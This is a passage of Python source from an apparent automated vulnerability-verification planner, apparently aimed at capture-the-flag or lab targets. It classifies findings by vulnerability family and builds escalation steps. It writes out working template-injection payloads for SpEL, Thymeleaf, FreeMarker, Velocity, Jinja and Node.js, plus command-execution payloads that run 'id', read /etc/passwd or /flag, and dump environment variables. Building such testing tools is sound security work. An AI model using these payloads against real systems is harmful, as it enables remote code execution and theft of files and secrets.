        for candidate in list(evidence.get("source_candidates", []) or []):
            name = str((candidate or {}).get("name", "") or "").strip().lower()
            location = str((candidate or {}).get("location", "") or "").strip().lower()
            if lowered_parameter and name == lowered_parameter:
                return True
            if location in {"query", "form", "body", "json"} and name in {"id", "q", "query", "search", "username", "email", "filter", "sort", "input"}:
                return True
        lower_text = " ".join([
            str(getattr(vuln, "type", "") or ""),
            str(getattr(vuln, "description", "") or ""),
            str(getattr(vuln, "code_snippet", "") or ""),
            str(getattr(vuln, "data_flow", "") or ""),
            str(getattr(vuln, "sink", "") or ""),
        ]).lower()
        if lowered_parameter and any(token in lower_text for token in ("request.args", "request.form", "request.values", "requestbody", "getparameter(", "@requestparam")):
            return True
        return False

    def _has_auth_source_evidence(self, vuln: Vulnerability, parameter_name: str) -> bool:
        evidence = getattr(vuln, "a1_evidence", {}) or {}
        lowered_parameter = str(parameter_name or "").strip().lower()
        auth_names = {"token", "authorization", "cookie", "session", "jwt", "next", "redirect", "x-user"}
        if lowered_parameter and lowered_parameter not in auth_names:
            return False
        for candidate in list(evidence.get("source_candidates", []) or []):
            name = str((candidate or {}).get("name", "") or "").strip().lower()
            location = str((candidate or {}).get("location", "") or "").strip().lower()
            if name in auth_names:
                return True
            if lowered_parameter and name == lowered_parameter and location in {"header", "cookie", "query", "body", "form"}:
                return True
        lower_text = " ".join([
            str(getattr(vuln, "type", "") or ""),
            str(getattr(vuln, "description", "") or ""),
            str(getattr(vuln, "code_snippet", "") or ""),
            str(getattr(vuln, "data_flow", "") or ""),
            str(getattr(vuln, "sink", "") or ""),
            str(getattr(vuln, "entry_point", "") or ""),
        ]).lower()
        explicit_source_patterns = (
            r"request\.headers\.get\(['\"](?:authorization|x-user|cookie)['\"]",
            r"request\.cookies?\.get\(['\"](?:token|session|jwt|cookie)['\"]",
            r"request\.(?:args|form|values)\.get\(['\"](?:token|next|redirect)['\"]",
        )
        return any(re.search(pattern, lower_text) for pattern in explicit_source_patterns)

    @staticmethod
    def _has_sql_injection_signal(lower_text: str) -> bool:
        text = str(lower_text or "").lower()
        explicit_patterns = (
            r"\bsql injection\b",
            r"\bsqli\b",
            r"\bblind sql injection\b",
            r"\bunion select\b",
        )
        if any(re.search(pattern, text) for pattern in explicit_patterns):
            return True
        weak_negative_markers = (
            "sqlite:///",
            "default sqlite database",
            "sqlalchemy_database_uri",
            "database_url",
        )
        if any(marker in text for marker in weak_negative_markers):
            return False
        query_signals = (
            "select ",
            "insert into",
            "update ",
            "delete from",
            "executequery",
            "preparedstatement",
            "statement.execute",
            "cursor.execute",
            "raw query",
            "executescript",
        )
        attacker_control_signals = (
            "requestparam",
            "getparameter(",
            "request.args",
            "request.form",
            "request.values",
            "request.json",
            "requestbody",
            "query parameter",
            "user-controlled",
            "pathvariable",
        )
        interpolation_signals = (
            "string concatenation",
            ".format(",
            "f\"",
            "f'",
            "%s",
            "{user_input}",
        )
        return any(signal in text for signal in query_signals) and (
            any(signal in text for signal in attacker_control_signals)
            or any(signal in text for signal in interpolation_signals)
        )

    @staticmethod
    def _template_engine_context(lower_text: str) -> str:
        text = lower_text or ""
        if any(marker in text for marker in ("thymeleaf", "templateengine.process", "springtemplateengine")):
            return "thymeleaf"
        if any(marker in text for marker in ("freemarker", "freemarker.template", "freemarkerconfigurer")):
            return "freemarker"
        if any(marker in text for marker in ("velocity", "velocityengine", "apache velocity")):
            return "velocity"
        if "jinja" in text:
            return "jinja"
        if any(marker in text for marker in ("spelexpressionparser", "templateparsercontext", "parseexpression(", "spel", "expression_chain")):
            return "spel"
        return "generic"

    @staticmethod
    def _template_injection_payloads(lower_text: str) -> List[str]:
        engine = A2ContractPlanner._template_engine_context(lower_text)
        if engine == "spel":
            return ["#{7*7}", "${7*7}", "{{7*7}}"]
        if engine == "thymeleaf":
            return ["${7*7}", "__${7*7}__::.x", "#{7*7}"]
        if engine == "freemarker":
            return ["${7*7}", "<#assign x=7*7>${x}", "#{7*7}"]
        if engine == "velocity":
            return ["#set($x=7*7)$x", "${7*7}", "{{7*7}}"]
        if engine == "jinja":
            return ["{{7*7}}", "{{ 7*7 }}", "${7*7}"]
        return ["{{7*7}}", "${7*7}", "#{7*7}"]

    @staticmethod
    def _template_injection_high_impact_payloads(vuln: Vulnerability, lower_text: str) -> List[str]:
        engine = A2ContractPlanner._template_engine_context(lower_text)
        if engine == "spel":
            return [
                "#{T(java.lang.System).getProperties()}",
                "#{T(java.lang.System).getenv()}",
                "#{new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))}",
                "#{new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}",
                "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}",
            ]
        if engine == "thymeleaf":
            return [
                "${T(java.lang.System).getProperties()}",
                "__${T(java.lang.System).getProperties()}__::.x",
                "${new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))}",
                "${new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}",
                "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}",
            ]
        if engine == "freemarker":
            return [
                "${.version}",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}",
            ]
        if engine == "velocity":
            return [
                "#set($p=$class.inspect(\"java.lang.System\").type.getProperties())$p",
                "#set($e=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))$e.waitFor()#set($s=$class.inspect(\"java.util.Scanner\").type.newInstance($e.getInputStream()).useDelimiter(\"\\\\A\"))$s.next()",
                "#set($e=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"cat /etc/passwd\"))$e.waitFor()#set($s=$class.inspect(\"java.util.Scanner\").type.newInstance($e.getInputStream()).useDelimiter(\"\\\\A\"))$s.next()",
                "#set($e=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"cat /flag\"))$e.waitFor()#set($s=$class.inspect(\"java.util.Scanner\").type.newInstance($e.getInputStream()).useDelimiter(\"\\\\A\"))$s.next()",
            ]
        if engine == "jinja":
            return ["{{ cycler.__init__.__globals__.os.popen('id').read() }}"]
        file_suffix = str(getattr(vuln, "file", "") or "").lower()
        if file_suffix.endswith((".ts", ".tsx", ".js", ".jsx")):
            return [
                "globalThis.process.mainModule.constructor._load('child_process').execSync('id').toString()",
                "globalThis.process.mainModule.constructor._load('fs').readFileSync('/flag','utf8')",
            ]
        return []

    @staticmethod
    def _template_injection_expected_indicators(vuln: Vulnerability, lower_text: str) -> List[str]:
        engine = A2ContractPlanner._template_engine_context(lower_text)
        file_suffix = str(getattr(vuln, "file", "") or "").lower()
        if engine == "spel":
            return ["uid=", "root:", "java.version", "PATH=", "49"]
        if engine == "thymeleaf":
            return ["uid=", "root:", "java.version", "49"]
        if engine == "freemarker":
            return ["uid=", "root:", "2.3.", "flag", "49"]
        if engine == "velocity":
            return ["uid=", "root:", "java.version", "49"]
        if engine == "jinja":
            return ["uid=", "49"]
        if file_suffix.endswith((".ts", ".tsx", ".js", ".jsx")):
            return ["uid=", "root:", "49"]
        return ["49"]

    @staticmethod
    def _command_execution_verification_payloads(vuln: Vulnerability, lower_text: str) -> List[str]:
        file_suffix = str(getattr(vuln, "file", "") or "").lower()
        if file_suffix.endswith((".ts", ".tsx", ".js", ".jsx")):
            return ["7*7"]
        return ["id"]

    @staticmethod
    def _command_execution_high_impact_payloads(vuln: Vulnerability, lower_text: str) -> List[str]:
        text = lower_text or ""
        file_suffix = str(getattr(vuln, "file", "") or "").lower()
        if file_suffix.endswith((".ts", ".tsx", ".js", ".jsx")) or "eval(" in text or "javascript" in text or "node" in text:
            return [
                "globalThis.process.mainModule.constructor._load('child_process').execSync('id').toString()",
                "globalThis.process.mainModule.constructor._load('fs').readFileSync('/flag','utf8')",
            ]
        if any(marker in text for marker in ("runtime.getruntime().exec", "processbuilder", ".exec(")):
            return ["id", "cat /flag"]
        return ["id"]

    @staticmethod
    def _command_execution_expected_indicators(vuln: Vulnerability, lower_text: str) -> List[str]:
        file_suffix = str(getattr(vuln, "file", "") or "").lower()
        if file_suffix.endswith((".ts", ".tsx", ".js", ".jsx")):
            return ["uid=", "root:", "CTF{", "flag{", "49"]
        return ["uid=", "root:", "CTF{", "flag{"]

    @staticmethod
    def _build_high_impact_ladder(vuln: Vulnerability, payload_family: str, verification_payloads: List[str], high_impact_payloads: List[str]) -> List[Dict[str, object]]:
        ladder: List[Dict[str, object]] = []
        if payload_family not in {"template-injection", "command-execution"}:
            return ladder
        for payload_text in high_impact_payloads or []:
            lowered = str(payload_text or "").lower()
            if "/etc/passwd" in lowered or "/flag" in lowered:
                goal = "file_read"
                indicators = ["root:"] if "/etc/passwd" in lowered else ["flag", "ctf{"]
            elif "getproperties" in lowered or "getenv" in lowered:
                goal = "info_disclosure"
                indicators = ["PATH="] if "getenv" in lowered else ["java.version"]
            elif ".version" in lowered:
                goal = "info_disclosure"
                indicators = ["2.3."]
            elif "getruntime().exec" in lowered or "runtime().exec" in lowered or "child_process" in lowered or "execsync" in lowered:
                goal = "command_execution"
                indicators = ["uid="]
            else:
                goal = "high_impact"
                indicators = []
            ladder.append({
                "step": len(ladder) + 1,
                "goal": goal,
                "payloads": [payload_text],
                "expected_indicators": indicators,
                "preferred_outcome": "high_impact_indicator_observed",
                "stop_on_success": True,
            })
        if verification_payloads:
            ladder.append({
                "step": len(ladder) + 1,
                "goal": "verification_only",
                "payloads": list(verification_payloads),
                "expected_indicators": ["49"],
                "preferred_outcome": "verification_indicator_observed",
                "stop_on_success": True,
            })
        return ladder

    @staticmethod
    def _guess_business_payload_family(lower_text: str) -> str:
        if "deserial" in lower_text or "readobject" in lower_text or "objectinputstream" in lower_text:
            return "deserialization"
        if any(needle in lower_text for needle in ("idor", "insecure direct object reference", "ownership", "owner_id", "user_id", "tenant_id", "resource_id")):
            return "idor"
        if any(needle in lower_text for needle in ("default credential", "hardcoded credential", "hardcoded password", "insecure credentials", "curl --user", "grafana")):
            return "default-credentials"
        mapping = (
            (("deserialize", "反序列化"), "deserialization"),
            (("csrf",), "csrf"),
            (("path", "traversal", "路径"), "path-traversal"),
            (("upload", "上传"), "file-upload"),
            (("redirect",), "open-redirect"),
            (("jwt",), "jwt"),
            (("cookie",), "cookie"),
            (("cors",), "cors"),
            (("auth", "鉴权"), "auth-bypass"),
            (("xpath",), "xpath-injection"),
            (("ldap",), "ldap-injection"),
            (("mongo", "nosql"), "nosql-injection"),
            (("xss",), "xss"),
            (("template", "ssti", "ognl", "spel"), "template-injection"),
            (("ssrf",), "ssrf"),
            (("xxe", "xml"), "xxe"),
            (("command", "runtime.exec", "processbuilder", "rce"), "command-execution"),
            (("race", "concurrent", "refund", "coupon"), "race-condition"),
            (("workflow", "approval", "bypass", "支付", "退款", "优惠券"), "workflow-bypass"),
        )
        for needles, family in mapping:
            if any(needle in lower_text for needle in needles):
                return family
        if A2ContractPlanner._has_sql_injection_signal(lower_text):
            return "sql-injection"
        return "generic"
